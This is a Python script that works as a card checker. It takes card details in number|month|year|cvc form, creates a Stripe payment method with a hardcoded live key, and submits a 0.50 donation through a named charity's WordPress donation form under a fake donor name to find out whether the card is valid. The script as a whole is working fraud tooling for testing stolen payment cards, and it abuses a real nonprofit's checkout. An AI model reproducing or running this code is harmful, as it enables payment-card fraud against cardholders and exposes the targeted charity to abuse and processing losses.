import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Frotary-icc.org&time_on_page=219351&key=pk_live_51QNL3XCVOxCQ48pBLnKJxzgU1mP4yhVrX30WnEuxvcfeu6SL5hAMIPiMQaW15QHNwdSaZOcIPPXgC05NiYVETPf300Vf8hfDZB'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '47704486-18ca-4ba9-981a-8897807be7e584acb7',
	    '__stripe_sid': 'e3bac744-1faf-4955-abed-921593c35c8bd572cf',
	}
	
	headers = {
	    'authority': 'rotary-icc.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=47704486-18ca-4ba9-981a-8897807be7e584acb7; __stripe_sid=e3bac744-1faf-4955-abed-921593c35c8bd572cf',
	    'origin': 'https://rotary-icc.org',
	    'referer': 'https://rotary-icc.org/donate/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744954533172',
	}
	
	data = {
	    'data': 'item_9__fluent_sf=&__fluent_protection_token_9=JUl0JN11pyWdSRiKyUFK4mPsauNhQ%2Be%2F7LHIp9AP7JpusefMj4QJC5xAqK3oMLCTuJGE0lnGb%2F1soI1l9nA4hv3G5IDw%2FKASSzpY5F4TXlUK3Od%2Bkb5ChKJN4zYtrzcB&__fluent_form_embded_post_id=37966&_fluentform_9_fluentformnonce=8303e6be02&_wp_http_referer=%2Fdonate%2F&first_name=Rodam&last_name=User&email=rodamuser08%40gmail.com&club=New%20York&amount=Custom%20amount&custom_amount=0.50&payment_method=stripe&comments=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '9',
	}
	
	r2 = requests.post(
	    'https://rotary-icc.org/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
	

